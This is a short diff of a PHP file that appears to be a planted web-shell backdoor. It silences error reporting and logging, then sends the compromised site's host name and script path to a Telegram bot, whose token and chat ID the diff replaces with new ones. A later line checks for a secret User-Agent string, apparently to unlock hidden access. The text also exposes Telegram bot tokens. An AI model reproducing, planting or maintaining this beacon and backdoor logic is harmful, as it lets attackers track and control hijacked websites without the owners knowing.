@@ -2,7 +2,7 @@ echo '</div>';
 error_reporting(0);
 error_log(0);
 
-file_get_contents("https://api.telegram.org/bot5108963799:AAFg_DkblHFVByuLfdDX_V5r0A3UkE7Pa7s/sendMessage?chat_id=-611906272&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
+file_get_contents("https://api.telegram.org/bot2106030496:AAEnL2fe3zROPVrnOESdclPHEsLZNm38gCg/sendMessage?chat_id=-608971843&text=" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
 
 if (isset($_SERVER['HTTP_USER_AGENT']) && $_SERVER['HTTP_USER_AGENT'] == "zch") {
 
